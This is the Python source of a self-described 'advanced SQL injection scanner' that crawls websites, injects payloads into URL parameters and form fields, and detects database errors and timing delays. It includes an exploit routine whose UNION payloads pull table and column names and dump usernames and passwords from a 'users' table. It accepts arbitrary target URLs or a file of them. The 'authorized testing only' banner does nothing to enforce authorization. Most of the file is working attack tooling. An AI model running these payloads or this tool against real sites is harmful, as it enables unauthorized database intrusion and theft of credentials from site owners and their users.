import requests
import time
import random
import sys
import os
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote

class AdvancedSQLiScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.vulnerable_params = []
        self.injection_points = []
        self.payloads = self.load_payloads()
        self.db_errors = self.load_db_errors()
        self.time_based_delay = 3
        
    def load_payloads(self):
        return {
            'boolean': [
                "' OR '1'='1",
                "' OR '1'='1' -- ",
                "' OR '1'='1' #",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'a'='a",
                "' OR 'x'='x",
                "' OR 1 --",
                "' OR 1=1 OR ''='",
                "' OR ''=''",
                "'='",
                "'LIKE'",
                "'=0--+",
                " OR 1=1",
                "' OR 'x'='x';",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 UNION SELECT 1,2,3--",
                "' OR 1=1 UNION SELECT null,null,null--"
            ],
            'error': [
                "'",
                '"',
                "`",
                "'\"",
                "')",
                '")',
                "`)",
                "'))",
                '"))',
                "`))",
                "' AND 1=CONVERT(int, @@version)--",
                "' OR CAST(@@version AS INT)--",
                "' AND SLEEP(5)--",
                "' OR BENCHMARK(10000000,MD5('test'))--",
                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
                "' OR 1=PG_SLEEP(5)--",
                "' OR 1=(SELECT 1 FROM PG_SLEEP(5))--",
                "' OR 1=WAITFOR DELAY '0:0:5'--"
            ],
            'union': [
                "' ORDER BY 1--",
                "' ORDER BY 2--",
                "' ORDER BY 3--",
                "' ORDER BY 4--",
                "' ORDER BY 5--",
                "' ORDER BY 6--",
                "' ORDER BY 7--",
                "' ORDER BY 8--",
                "' ORDER BY 9--",
                "' ORDER BY 10--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT @@version,2--",
                "' UNION SELECT user(),2--",
                "' UNION SELECT database(),2--",
                "' UNION SELECT version(),2--",
                "' UNION SELECT table_name,2 FROM information_schema.tables--",
                "' UNION SELECT column_name,2 FROM information_schema.columns--",
                "' UNION SELECT concat(table_name,':',column_name),2 FROM information_schema.columns--"
            ],
            'time': [
                "' OR SLEEP(5)--",
                "' OR BENCHMARK(1000000,MD5('test'))--",
                "' OR PG_SLEEP(5)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
                "' OR WAITFOR DELAY '0:0:5'--",
                "' OR (SELECT COUNT(*) FROM information_schema.columns) > 0 AND PG_SLEEP(5)--"
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
                "' AND ASCII(SUBSTRING(@@version,1,1))=53--",
                "' AND LENGTH(@@version)=1--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' AND (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE 'a%'--",
                "' AND (SELECT user()) LIKE 'root%'--",
                "' AND (SELECT database()) LIKE 'test%'--"
            ]
        }
    
    def load_db_errors(self):
        return {
            'mysql': [
                'SQL syntax.*MySQL',
                'Warning.*mysql_.*',
                'MySQL Query fail.*',
                'MySQLi_.*',
                'MySqlClient\.',
                'com\.mysql\.jdbc',
                'You have an error in your SQL syntax'
            ],
            'postgresql': [
                'PostgreSQL.*ERROR',
                'Warning.*\Wpg_.*',
                'valid PostgreSQL result',
                'Npgsql\.',
                'PG::SyntaxError',
                'org\.postgresql\.util\.PSQLException'
            ],
            'mssql': [
                'Driver.* SQL[\-\_\ ]*Server',
                'OLE DB.* SQL Server',
                '\bSQL Server.*Driver',
                'Warning.*mssql_.*',
                '\bSQL Server.*[0-9a-fA-F]{8}',
                'System\.Data\.SqlClient\.SqlException',
                '(?s)Exception.*\WSystem\.Data\.SqlClient\.',
                '(?s)Exception.*\WRoadhouse\.Cms\.'
            ],
            'oracle': [
                '\bORA-[0-9][0-9][0-9][0-9]',
                'Oracle error',
                'Oracle.*Driver',
                'Warning.*\Woci_.*',
                'Warning.*\Wora_.*'
            ],
            'sqlite': [
                'SQLite/JDBCDriver',
                'SQLite\.Exception',
                'System\.Data\.SQLite\.SQLiteException',
                'Warning.*sqlite_.*',
                'Warning.*SQLite3::',
                '\[SQLITE_ERROR\]'
            ]
        }
    
    def extract_forms(self, url):
        try:
            response = self.session.get(url, timeout=10)
            forms = []
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_details = {}
                form_details['action'] = form.get('action')
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all('input'):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except:
            return []
    
    def extract_links(self, url):
        try:
            response = self.session.get(url, timeout=10)
            links = []
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    full_url = urljoin(url, href)
                    links.append(full_url)
            
            return links
        except:
            return []
    
    def test_parameter(self, url, params, param_name, payload):
        test_params = params.copy()
        original_value = test_params.get(param_name, '')
        test_params[param_name] = original_value + payload
        
        try:
            start_time = time.time()
            response = self.session.get(url, params=test_params, timeout=15)
            elapsed = time.time() - start_time
            
            content = response.text.lower()
            status = response.status_code
            
            for db_type, error_patterns in self.db_errors.items():
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'vulnerable': True,
                            'type': 'error',
                            'db': db_type,
                            'payload': payload,
                            'param': param_name
                        }
            
            if 'syntax error' in content or 'sql error' in content:
                return {
                    'vulnerable': True,
                    'type': 'syntax_error',
                    'payload': payload,
                    'param': param_name
                }
            
            if elapsed > self.time_based_delay:
                return {
                    'vulnerable': True,
                    'type': 'time_based',
                    'delay': elapsed,
                    'payload': payload,
                    'param': param_name
                }
            
            if original_value and original_value in response.text:
                return {
                    'vulnerable': False,
                    'type': 'safe'
                }
            
        except requests.exceptions.Timeout:
            return {
                'vulnerable': True,
                'type': 'timeout',
                'payload': payload,
                'param': param_name
            }
        except:
            pass
        
        return {'vulnerable': False}
    
    def scan_url(self, url):
        print(f"\n[SCANNING] {url}")
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        all_params = {}
        for param, values in query_params.items():
            all_params[param] = values[0] if values else ''
        
        vulnerabilities = []
        
        if all_params:
            print(f"[INFO] Found {len(all_params)} parameters to test")
            
            for param_name in all_params.keys():
                print(f"[TESTING] Parameter: {param_name}")
                
                test_payloads = random.sample(self.payloads['error'], 3) + \
                               random.sample(self.payloads['boolean'], 2) + \
                               random.sample(self.payloads['time'], 1)
                
                for payload in test_payloads:
                    result = self.test_parameter(url, all_params, param_name, payload)
                    
                    if result.get('vulnerable'):
                        vulnerabilities.append({
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'type': result['type'],
                            'db_type': result.get('db', 'unknown')
                        })
                        
                        print(f"[VULNERABLE] {param_name} = {payload[:30]}...")
                        print(f"  Type: {result['type']} | DB: {result.get('db', 'N/A')}")
                        break
                
                time.sleep(0.5)
        
        forms = self.extract_forms(url)
        print(f"[INFO] Found {len(forms)} forms to test")
        
        for form in forms:
            form_url = urljoin(url, form['action']) if form['action'] else url
            form_method = form['method']
            form_inputs = form['inputs']
            
            print(f"[FORM] Testing form at {form_url}")
            
            form_data = {}
            for input_field in form_inputs:
                if input_field['type'] in ['text', 'password', 'email', 'search']:
                    form_data[input_field['name']] = input_field['value'] or 'test'
            
            if form_data:
                for field_name in form_data.keys():
                    test_payloads = self.payloads['boolean'][:2] + self.payloads['error'][:2]
                    
                    for payload in test_payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            if form_method == 'post':
                                response = self.session.post(form_url, data=test_data, timeout=10)
                            else:
                                response = self.session.get(form_url, params=test_data, timeout=10)
                            
                            content = response.text.lower()
                            
                            for db_type, error_patterns in self.db_errors.items():
                                for pattern in error_patterns:
                                    if re.search(pattern, response.text, re.IGNORECASE):
                                        vulnerabilities.append({
                                            'url': form_url,
                                            'parameter': field_name,
                                            'payload': payload,
                                            'type': 'form_error',
                                            'db_type': db_type,
                                            'form_field': True
                                        })
                                        print(f"[FORM VULNERABLE] {field_name} = {payload[:30]}...")
                                        break
                        
                        except:
                            pass
                        
                        time.sleep(0.3)
        
        links = self.extract_links(url)
        print(f"[INFO] Found {len(links)} links for further scanning")
        
        return vulnerabilities, links
    
    def deep_scan(self, start_url, max_depth=2, max_pages=20):
        print(f"\n[DEEP SCAN] Starting from {start_url}")
        print(f"Depth: {max_depth} | Max pages: {max_pages}")
        
        visited = set()
        to_visit = [(start_url, 0)]
        all_vulnerabilities = []
        
        while to_visit and len(visited) < max_pages:
            current_url, depth = to_visit.pop(0)
            
            if current_url in visited or depth > max_depth:
                continue
            
            visited.add(current_url)
            print(f"\n[PAGE {len(visited)}/{max_pages}] Scanning: {current_url}")
            
            try:
                vulnerabilities, links = self.scan_url(current_url)
                all_vulnerabilities.extend(vulnerabilities)
                
                for link in links:
                    if link not in visited:
                        to_visit.append((link, depth + 1))
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[ERROR] Failed to scan {current_url}: {e}")
        
        return all_vulnerabilities
    
    def generate_report(self, vulnerabilities):
        if not vulnerabilities:
            print("\n[REPORT] No SQL injection vulnerabilities found")
            return
        
        print("\n" + "="*70)
        print("SQL INJECTION SCAN REPORT")
        print("="*70)
        print(f"Total Vulnerabilities Found: {len(vulnerabilities)}")
        
        by_type = {}
        by_db = {}
        
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            db_type = vuln.get('db_type', 'unknown')
            
            by_type[vuln_type] = by_type.get(vuln_type, 0) + 1
            by_db[db_type] = by_db.get(db_type, 0) + 1
        
        print("\nBy Vulnerability Type:")
        for vuln_type, count in by_type.items():
            print(f"  {vuln_type}: {count}")
        
        print("\nBy Database Type:")
        for db_type, count in by_db.items():
            print(f"  {db_type}: {count}")
        
        print("\nDetailed Findings:")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(f"\n{i}. URL: {vuln['url']}")
            print(f"   Parameter: {vuln['parameter']}")
            print(f"   Payload: {vuln['payload'][:50]}...")
            print(f"   Type: {vuln['type']} | DB: {vuln.get('db_type', 'N/A')}")
        
        if len(vulnerabilities) > 10:
            print(f"\n... and {len(vulnerabilities) - 10} more vulnerabilities")
        
        print("\n" + "="*70)
        
        return vulnerabilities
    
    def exploit_vulnerability(self, vuln_info):
        print(f"\n[EXPLOITING] {vuln_info['url']}")
        print(f"Parameter: {vuln_info['parameter']}")
        
        parsed_url = urlparse(vuln_info['url'])
        query_params = parse_qs(parsed_url.query)
        
        base_params = {}
        for param, values in query_params.items():
            base_params[param] = values[0] if values else ''
        
        exploit_payloads = [
            "' UNION SELECT @@version,user(),database()--",
            "' UNION SELECT table_name,2 FROM information_schema.tables--",
            "' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT concat(username,':',password),2 FROM users--"
        ]
        
        for payload in exploit_payloads:
            print(f"\n[Trying] {payload}")
            
            test_params = base_params.copy()
            test_params[vuln_info['parameter']] = payload
            
            try:
                response = self.session.get(vuln_info['url'], params=test_params, timeout=10)
                
                if response.status_code == 200:
                    print("[RESPONSE] Received successful response")
                    
                    from bs4 import BeautifulSoup
                    soup = BeautifulSoup(response.text, 'html.parser')
                    text = soup.get_text()
                    
                    lines = text.split('\n')
                    for line in lines:
                        line = line.strip()
                        if line and len(line) < 100:
                            print(f"  -> {line}")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[ERROR] {e}")

def main():
    print("\n" + "="*70)
    print("AIO TOOLS - ADVANCED SQL INJECTION SCANNER")
    print("="*70)
    print("For authorized security testing only!")
    print("="*70)
    
    scanner = AdvancedSQLiScanner()
    
    try:
        print("\n[OPTIONS]")
        print("1. Quick scan (single URL)")
        print("2. Deep scan (crawl website)")
        print("3. Test specific parameter")
        print("4. Load URLs from file")
        
        choice = input("\nSelect option (1-4): ").strip()
        
        if choice == '1':
            url = input("Enter URL to scan: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            vulnerabilities, _ = scanner.scan_url(url)
            scanner.generate_report(vulnerabilities)
            
            if vulnerabilities:
                exploit = input("\nAttempt to exploit vulnerabilities? (y/n): ").strip().lower()
                if exploit == 'y':
                    for vuln in vulnerabilities[:3]:
                        scanner.exploit_vulnerability(vuln)
        
        elif choice == '2':
            url = input("Enter starting URL: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            depth = input("Crawl depth (default 2): ").strip()
            depth = int(depth) if depth.isdigit() else 2
            
            max_pages = input("Max pages to scan (default 20): ").strip()
            max_pages = int(max_pages) if max_pages.isdigit() else 20
            
            vulnerabilities = scanner.deep_scan(url, depth, max_pages)
            scanner.generate_report(vulnerabilities)
        
        elif choice == '3':
            url = input("Enter URL with parameters: ").strip()
            param = input("Enter parameter name to test: ").strip()
            
            test_payloads = scanner.payloads['union'][:5] + scanner.payloads['error'][:3]
            
            print(f"\n[TESTING] {param} on {url}")
            
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            base_params = {}
            for p, values in query_params.items():
                base_params[p] = values[0] if values else ''
            
            for payload in test_payloads:
                print(f"\nPayload: {payload}")
                
                test_params = base_params.copy()
                test_params[param] = payload
                
                try:
                    response = scanner.session.get(url, params=test_params, timeout=10)
                    print(f"Status: {response.status_code}")
                    print(f"Length: {len(response.text)} chars")
                    
                    if 'error' in response.text.lower():
                        print("Possible SQL error detected!")
                    
                except Exception as e:
                    print(f"Error: {e}")
                
                time.sleep(1)
        
        elif choice == '4':
            filename = input("Enter filename with URLs: ").strip()
            
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                
                print(f"[LOADED] {len(urls)} URLs")
                
                all_vulns = []
                for url in urls[:10]:
                    try:
                        vulns, _ = scanner.scan_url(url)
                        all_vulns.extend(vulns)
                    except:
                        pass
                
                scanner.generate_report(all_vulns)
            else:
                print("[ERROR] File not found")
        
        else:
            print("[ERROR] Invalid choice")
    
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Scan stopped")
    except Exception as e:
        print(f"[ERROR] {e}")
    
    print("\n[COMPLETE] SQL Injection scan finished")
    time.sleep(2)

if __name__ == "__main__":
    main()